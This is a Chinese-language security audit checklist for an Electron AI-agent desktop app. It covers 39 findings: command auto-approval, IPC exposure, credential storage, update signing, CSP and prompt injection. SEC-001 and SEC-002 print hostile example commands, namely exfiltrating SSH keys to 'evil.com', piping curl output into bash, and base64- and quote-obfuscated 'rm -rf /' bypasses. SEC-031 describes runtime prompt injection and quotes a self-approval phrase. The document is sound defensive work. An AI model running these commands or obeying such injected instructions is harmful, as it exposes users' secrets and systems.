# LobsterAI 安全风险评估清单

> 评估时间：2026-05-04
> 评估范围：`src/main/`、`src/renderer/`、`electron-builder.json`、`build/entitlements.mac.plist`
> 评估方式：源码静态审查
> 状态图例：`OPEN` 未修复 / `WIP` 修复中 / `FIXED` 已修复 / `ACCEPTED` 已接受风险

---

## P0 — Critical（必修，直接导致 RCE / 凭据外泄）

> **SEC-001 / SEC-002 / SEC-003 关联设计文档**：[command-permission-policy.md](./command-permission-policy.md) — 参考 Anthropic Auto Mode 的五档权限模式 + 决策流水线 + 7 维度静态分类器方案。

### SEC-001 Cowork Agent 默认放行所有非删除命令 [OPEN]
- **位置**：`src/main/libs/agentEngine/openclawRuntimeAdapter.ts:3275-3284`
- **问题**：`isChannelSession || !isDeleteCommand(command)` 直接 auto-approve；IM 通道任何命令都自动批准。
- **影响**：恶意 prompt / IM 消息可触发 `curl evil.com -d @~/.ssh/id_rsa`、`echo … >> ~/.zshrc`、`bash -c "$(curl …)"`、`chmod -R 777 /`、`launchctl/schtasks/reg add` 等数据外泄、提权、持久化命令；IM 场景下一条恶意 DM = 受害机任意命令执行。
- **修复方向**：默认拒绝；按命令分类 + cwd 白名单；IM 通道必须强制人工审批或绑定到只读会话；记录审批审计日志。

### SEC-002 危险命令检测纯正则黑名单可绕过 [OPEN]
- **位置**：`src/main/libs/commandSafety.ts`
- **问题**：仅匹配 `rm/git push/chmod/kill` 等关键字；缺少网络外泄（curl/wget/nc/scp/rsync/git push 远端）、持久化（autostart/launchctl/cron/registry/shell rc）、解码执行（base64/eval）维度。
- **绕过例**：`r''m -rf /`、`\rm -rf /`、`echo cm0gLXJmIC8= | base64 -d | sh`、`bash -c $'rm\x20-rf\x20/'`、heredoc、PowerShell `Remove-Item` 别名。
- **修复方向**：用 AST 级 bash/PowerShell 解析（参考 OpenAI Codex sandbox / Claude Code 的命令分类器）；从黑名单转分类白名单；增加"网络/持久化/特权"维度。

### SEC-003 Sandbox 模式仅企业版生效 [OPEN]
- **位置**：`src/main/libs/openclawConfigSync.ts:59-73` `mapExecutionModeToSandboxMode`
- **问题**：`if (!isEnterprise) return 'off'`，消费端无论 UI 选什么 `executionMode`，结果都是 `off`。
- **影响**：UI 呈现"sandbox"选项给消费端，构成安全错觉；命令直接在主机运行。
- **修复方向**：消费端也接入 sandbox 实现（macOS `sandbox-exec`、Linux bubblewrap、Windows AppContainer/Job Object），或在 UI 隐藏不可用选项并文案明示。

### SEC-004 Preload 暴露通用 IPC 通道 [OPEN]
- **位置**：`src/main/preload.ts:116-125`
- **问题**：暴露 `ipcRenderer.send` / `ipcRenderer.on` 接受任意 channel；contextBridge 白名单作废。
- **影响**：一处 XSS = 主进程任意 IPC 调用 = 任意命令。
- **修复方向**：删除该桥；所有 IPC 走显式命名 API；引入 `IpcChannel` 常量集中管理（已有 `scheduledTask/constants.ts` 可参考）。

### SEC-005 `store.get/set/remove` 接受任意键 [OPEN]
- **位置**：`src/main/main.ts:2034-2054`
- **问题**：渲染端可通过 `electron.store.get('auth_tokens')`、`'enterprise_config'` 直接读所有 IM/MCP/OAuth 凭据。
- **影响**：XSS / 恶意 markdown → 一行代码窃取所有凭据。
- **修复方向**：键名白名单 + 敏感键禁读；token 改走 `auth.*` 专用 IPC，access token 不返回到 renderer。

### SEC-006 `shell.openExternal` / `shell.openPath` 无 scheme 校验 [OPEN]
- **位置**：`src/main/main.ts:4927-4958`
- **问题**：未过滤 `javascript:` / `file://` / `vscode://` / `ms-msdt:` / `smb://` / `vbscript:` / `ms-officecmd:` 等协议。
- **影响**：Windows 上配合 Office/Outlook URL handler 可 RCE（CVE-2022-30190 类）；`smb://` 触发凭据反射。`shell:openPath` 可一键打开 `.bat/.scr/.lnk`。
- **修复方向**：scheme allowlist（仅 `https`/`http`/`mailto`）；`openPath` 限定到 LobsterAI 工作区目录前缀。

### SEC-007 `localfile://` 协议无路径校验 [OPEN]
- **位置**：`src/main/main.ts:5573-5578`
- **问题**：直接 `net.fetch('file://' + url.pathname)`，无白名单。
- **影响**：CSP `img-src ... localfile:` 配合 XSS 可读取 `~/.ssh/id_rsa`、`~/.aws/credentials` 并外泄（配合 SEC-014 的 `connect-src *`）。
- **修复方向**：仅允许 LobsterAI 受管目录（项目工作区、`userData/attachments/`）；规范化路径并防 `..` 逃逸。

### SEC-008 `dialog:readFileAsDataUrl` 可读任意本地文件 [OPEN]
- **位置**：`src/main/main.ts:4894-4924`
- **问题**：仅校验文件大小，无路径白名单 / cwd 限定。
- **影响**：XSS → 任意敏感文件 base64 抓取。
- **修复方向**：路径白名单（cowork workspace + 用户主动选择的临时文件）；调用必须由真实的 `dialog.showOpenDialog` 用户操作触发。

### SEC-009 Linux/Windows 全局禁用 Chromium 沙箱 [OPEN]
- **位置**：`src/main/main.ts:711-713`
- **问题**：`app.commandLine.appendSwitch('no-sandbox')` 抵消 `webPreferences.sandbox: true`。
- **影响**：渲染端嵌入 markdown / artifacts / 三方内容，无沙箱即直接以用户权限 RCE。
- **修复方向**：恢复沙箱；Windows 管理员场景单独处理（提示用户降权运行或通过 Job Object）。

### SEC-010 自动更新只校验 SHA-256，无代码签名验证 [OPEN]
- **位置**：`src/main/libs/appUpdateCoordinator.ts:772-784`、`src/main/libs/appUpdateInstaller.ts:256` `hdiutil attach … -noverify`
- **问题**：哈希与二进制由同一通道获取，MITM 或服务端被攻陷即植入木马；DMG 挂载跳过签名校验。
- **修复方向**：macOS `codesign --verify --deep --strict` + `spctl --assess`；Windows `signtool verify`；或附带 Ed25519 detached signature + 内嵌公钥验证。

### SEC-011 Windows 构建未配置代码签名 [OPEN]
- **位置**：`electron-builder.json` `win` 块
- **问题**：缺少 `certificateFile`、`signingHashAlgorithms`、`publisherName`、`signtoolOptions`。
- **影响**：用户安装触发 SmartScreen 警告；无可信发布者；为 SEC-010 的修复前提。
- **修复方向**：接入 Windows EV Code Signing 证书；Linux deb/AppImage 增加 GPG / dpkg-sig 签名。

### SEC-012 Electron Fuses 与 ASAR Integrity 未启用 [OPEN]
- **位置**：仓库未发现 `@electron/fuses` 依赖
- **问题**：未关闭 `RunAsNode`、`EnableNodeOptionsEnvironmentVariable`、`EnableNodeCliInspectArguments`；ASAR 可被解包替换。
- **修复方向**：接入 `@electron/fuses`，关闭上述危险 fuse；启用 `OnlyLoadAppFromAsar` 与 ASAR Integrity（macOS plist + Windows Resource）。低成本高收益。

---

## P1 — High（凭据保护、CSP 收敛、供应链）

### SEC-013 `auth_tokens` 与 IM/MCP 凭据明文存储 [OPEN]
- **位置**：`src/main/main.ts:2218-2227` `saveAuthTokens` / SQLite kv
- **问题**：未使用 Electron `safeStorage`（macOS Keychain / Windows DPAPI / Linux libsecret），SQLite 整库无加密（未启用 SQLCipher）。
- **影响**：磁盘读权限 = 直接登录用户账号 + 所有 IM bot token / appSecret / MCP env / API key 泄露。
- **修复方向**：敏感键统一 `safeStorage.encryptString` 后落盘；DB 切 SQLCipher 并把主密钥用 `safeStorage` 包。

### SEC-014 CSP `connect-src *` 与 `'unsafe-inline'` style-src [OPEN]
- **位置**：`src/main/main.ts:5204-5215`
- **问题**：渲染端可向任意域名外泄；CSS exfiltration（`background: url(http://x?token=…)`）有效。
- **修复方向**：`connect-src` 收敛为 lobsterai-server + 已配置 LLM provider 域名（动态生成）；`style-src` 移除 `'unsafe-inline'` 改用 nonce/hash；加 `Permissions-Policy` header。

### SEC-015 主登录流程缺少 PKCE 与 state [OPEN]
- **位置**：`src/main/main.ts:2305-2348` `auth:login` / `auth:exchange`
- **问题**：仅 `?source=electron`，deep link `code` 直接换 token，无 `state` 防 CSRF，无设备绑定。
- **对比**：仓库内 MiniMax（`Settings.tsx:1366`）和 OpenAI Codex（`openaiCodexAuth.ts:90`）都有 PKCE。
- **影响**：抢注 `lobsterai://` 协议的进程或浏览器扩展可截获 authCode 完成登录。
- **修复方向**：服务端 + 客户端同时改造为 PKCE + state；deep link 回调时校验 state。

### SEC-016 渲染端可拿 access token [OPEN]
- **位置**：`src/main/preload.ts:534` `auth.getAccessToken`
- **问题**：renderer 一处 XSS 即可直接调用付费配额 API。
- **修复方向**：删除该 API；所有 LLM/服务端调用走 main process 代理（已有 `api:fetch`/`api:stream`），renderer 永不接触 token。

### SEC-017 "导出加密"密钥本身明文存储 [OPEN]
- **位置**：`src/renderer/services/encryption.ts`
- **问题**：32 字节 raw key 写入 SQLite kv + localStorage（base64）；PBKDF2 迭代 100k 低于 OWASP 2023 指南（≥ 600k）。
- **修复方向**：密钥用 `safeStorage` 包；PBKDF2 升级到 600k 或换 Argon2id。

### SEC-018 日志泄露 PII / token [OPEN]
- **位置**：`src/main/main.ts:2342` `console.log('[Auth] exchange user data:', JSON.stringify(body.data.user))` 等
- **问题**：日志由 `log:exportZip` 直接打包给用户/支持团队，无字段级 redaction。
- **修复方向**：建立日志 redaction 中间件（token / refreshToken / appSecret / clientSecret / botToken / cookies / Authorization header 全部脱敏）；导出前再过一遍。

### SEC-019 IPC 缺少 sender frame 校验 [OPEN]
- **位置**：所有 `ipcMain.handle` 回调
- **问题**：未检查 `event.senderFrame?.url`；WeCom 授权子窗口（`main.ts:5287`）一旦被劫持仍能调用主进程 IPC（preload 共享）。
- **修复方向**：在 IPC handler 包装层校验 `senderFrame.url` 是主窗口 origin；子窗口仅允许有限白名单 channel。

### SEC-020 Skill 安全扫描非阻断 [OPEN]
- **位置**：`src/main/skillManager.ts:1728`、`1892` `console.warn('[SkillManager] Security scan failed (non-blocking):', err);`
- **问题**：即使 js-x-ray 报 `data-exfiltration` / `unsafe-command` `critical`，仍照装。
- **修复方向**：critical 强阻断；danger 需用户显式确认；建立可信 ClawHub 签名仓库。

### SEC-021 Skill 来源无签名/无可信仓库约束 [OPEN]
- **位置**：`src/main/skillManager.ts` `downloadSkill` 系列
- **问题**：接受任意 GitHub repo / npm 包 / 任意 zip URL；虽然 `--ignore-scripts` 阻 install hook，但 skill 中脚本由 cowork agent 调用执行（无 sandbox，见 SEC-003）。
- **修复方向**：建立 ClawHub 官方签名清单；非可信源强制 critical 警告 + 二次确认；可选 publisher pinning。

### SEC-022 企业 manifest 无签名校验 [OPEN]
- **位置**：`src/main/libs/enterpriseConfigSync.ts:308` `fs.readFileSync(manifestPath, 'utf-8')`
- **问题**：横向移动后写入 `userData/enterprise-config/` 即可覆盖 agent / skill / MCP / OpenClaw 策略。
- **修复方向**：manifest 附带签名 + 内嵌 IT 签名公钥校验；或限制 manifest 路径只读（系统级目录）。

### SEC-023 OpenClaw 运行时无哈希钉死 [OPEN]
- **位置**：`package.json.openclaw.version` + `OPENCLAW_SRC` 默认 `../openclaw`
- **问题**：CI 仅 `git checkout` 版本号，没有 tarball SHA-256 / Cosign。
- **修复方向**：`package.json.openclaw` 增加 `sha256` 字段；构建脚本失败优先校验。

### SEC-024 macOS hardened-runtime entitlements 过宽 [OPEN]
- **位置**：`build/entitlements.mac.plist:5-11`
- **问题**：`com.apple.security.cs.allow-unsigned-executable-memory` + `allow-dyld-environment-variables` 几乎绕过 hardened-runtime。
- **修复方向**：主进程 entitlements 收敛；OpenClaw 子二进制需要时单独签 entitlements；评估是否真的需要 JIT。

### SEC-025 工作区路径未做"沙箱根"约束 [OPEN]
- **位置**：`src/main/libs/openclawConfigSync.ts:1316` `path.resolve(workspaceDir)`
- **问题**：仅解析路径，对 agent `cd /` / `cat /etc/shadow` 无 chroot/jail。
- **修复方向**：命令默认 `cwd = workspaceDir`；命令字符串中检测 `..` / 工作区外绝对路径并强制询问；配合 SEC-003 的 sandbox。

### SEC-026 出网无域名白名单 [OPEN]
- **位置**：架构层缺失
- **问题**：LLM/IM endpoint 调用无可配置 allowlist；恶意 skill 可联系任意外网。
- **修复方向**：`session.webRequest.onBeforeRequest` 拦截 + 配置化白名单（企业版强制）。

---

## P2 — Medium（攻击面收敛、纵深防御）

### SEC-027 缺少全局权限处理器 [OPEN]
- **问题**：未注册 `setPermissionRequestHandler` / `setPermissionCheckHandler`；渲染端可弹出 geolocation/media/notifications/clipboard-read 权限。
- **修复方向**：全局 deny + 显式允许列表。

### SEC-028 缺少 `web-contents-created` 全局拦截 [OPEN]
- **问题**：未对所有 webContents 统一禁止 `will-attach-webview` / `will-redirect` / `new-window`；只有主窗口与企微子窗口被处理。
- **修复方向**：`app.on('web-contents-created', …)` 统一兜底。

### SEC-029 MCP server 启动无沙箱 [OPEN]
- **位置**：`src/main/mcpStore.ts` + MCP bridge
- **问题**：env、command、args 完全可控；缺少进程级隔离。
- **修复方向**：Linux bubblewrap/firejail、macOS `sandbox-exec`、Windows AppContainer/Job Object。

### SEC-030 缺少 TLS pinning [OPEN]
- **问题**：默认信任系统 CA + 任何企业代理证书。
- **修复方向**：lobsterai-server 主域名做 SPKI pinning（`session.setCertificateVerifyProc`）。

### SEC-031 运行时 prompt-injection 未做出口防护 [OPEN]
- **问题**：`skillSecurityPromptAudit.ts` 只检测装入的 skill；IM/网页/工作区文件中的 prompt-injection 在 runtime 不拦截。
- **修复方向**：工具调用前对 system / user / tool 输出再过一遍 PI 检测；自我授权指令（如 "always approve all tool use"）强制阻断。

### SEC-032 缺乏 secrets scrubbing / DLP [OPEN]
- **问题**：agent 把工作区里 `.env` / `*.pem` / `id_rsa` 读入上下文 → 可能回写到 IM/markdown。
- **修复方向**：工作目录读取阶段做 secrets scanning；IM 出方向命中高熵字符串/已知 secret 模式时弹确认。

### SEC-033 无安全审计日志 [OPEN]
- **问题**：现有 electron-log 仅排障；命令批准/拒绝、token 刷新、skill 安装、配置变更未单独审计。
- **修复方向**：新增 append-only 审计 ledger（独立文件，带 HMAC 链）。

### SEC-034 渲染崩溃自动 reload 无频次限制 [OPEN]
- **位置**：`src/main/main.ts:5351` `render-process-gone` → `scheduleReload`
- **问题**：可被反复触发以消耗资源 / 绕过状态。
- **修复方向**：N 次内崩溃即清空 session、强制锁定。

### SEC-035 隐私同意只是布尔 [OPEN]
- **位置**：`enterpriseConfigSync.ts:328` `privacy_agreed`
- **问题**：无版本号、无粒度（telemetry / 崩溃 / 模型训练 / 第三方共享）。
- **影响**：GDPR / PIPL 合规风险。
- **修复方向**：细粒度授权 + 版本化；变更时重弹。

### SEC-036 `BrowserWindow` 未显式 deny 危险 webPreferences [OPEN]
- **修复方向**：显式 `allowRunningInsecureContent: false`；显式禁用 `webview` tag。

---

## P3 — 卫生 / 长期

### SEC-037 缺少依赖供应链监控 [OPEN]
- **问题**：未见 `npm audit` 在 CI / Dependabot / Renovate / SBOM。
- **修复方向**：CI 集成 `npm audit --production`；接入 Renovate；用 `@cyclonedx/cyclonedx-npm` 生成 SBOM。

### SEC-038 GitHub Copilot device flow token 未加密 [OPEN]
- **问题**：`github-copilot:*` IPC 把 token 落盘到 store（同 SEC-013）。
- **修复方向**：与 SEC-013 一并用 `safeStorage` 加密。

### SEC-039 `hdiutil … -noverify` [OPEN]
- **位置**：`src/main/libs/appUpdateInstaller.ts:256`
- **问题**：DMG 挂载跳过签名校验。
- **修复方向**：先 `spctl --assess --type install` 验签再挂载（与 SEC-010 联动）。

---

## 优先级整改路线图

| 优先级 | 任务 | 关联条目 | 估算难度 |
|---|---|---|---|
| P0 | 改写 cowork 自动批准策略 | SEC-001 | 中 |
| P0 | 命令检测换 AST 分类引擎 | SEC-002 | 高 |
| P0 | 渲染端凭据保护（store 白名单 / token 不出 main） | SEC-005, SEC-016 | 中 |
| P0 | safeStorage + SQLCipher | SEC-013, SEC-038 | 中 |
| P0 | 移除 preload 通用 IPC | SEC-004 | 低 |
| P0 | shell/protocol/dialog API 加白名单 | SEC-006, SEC-007, SEC-008 | 低 |
| P0 | 恢复 Chromium sandbox | SEC-009 | 中 |
| P0 | 自动更新代码签名校验 + Win 构建签名 | SEC-010, SEC-011 | 中 |
| P0 | 启用 Electron Fuses + ASAR Integrity | SEC-012 | 低 |
| P1 | PKCE + state | SEC-015 | 中 |
| P1 | CSP 收紧 + Permissions-Policy | SEC-014 | 中 |
| P1 | 全局权限处理器 + web-contents-created hook | SEC-027, SEC-028 | 低 |
| P1 | Skill 扫描强阻断 + 可信仓库 | SEC-020, SEC-021 | 中 |
| P1 | 企业 manifest 签名 + OpenClaw 哈希钉死 | SEC-022, SEC-023 | 中 |
| P1 | 工作区路径约束 + 出网白名单 | SEC-025, SEC-026 | 高 |
| P1 | macOS entitlements 收敛 | SEC-024 | 中 |
| P2 | 审计日志 + DLP + secrets scrubbing | SEC-031, SEC-032, SEC-033 | 中 |
| P2 | TLS pinning | SEC-030 | 中 |
| P2 | 隐私授权细粒度 + MCP/skill sandbox | SEC-029, SEC-035 | 高 |
| P3 | CI 集成 npm audit / Renovate / SBOM | SEC-037 | 低 |

---

## 变更记录

| 日期 | 作者 | 说明 |
|---|---|---|
| 2026-05-04 | 安全审查（Cursor + Claude Opus 4.7） | 初版评估，39 项风险 |
